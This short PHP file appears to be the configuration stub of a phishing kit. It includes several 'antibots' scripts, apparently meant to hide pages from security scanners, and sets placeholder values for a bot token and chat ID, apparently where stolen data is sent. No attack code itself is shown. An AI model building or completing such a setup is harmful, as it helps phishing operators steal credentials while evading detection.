<?php


include "antibots/anti1.php";
include "antibots/anti2.php";
include "antibots/anti3.php";
include "antibots/anti4.php";
include "antibots/anti8.php";



$token = "yourtoken";
$chatid = "chatid";



?>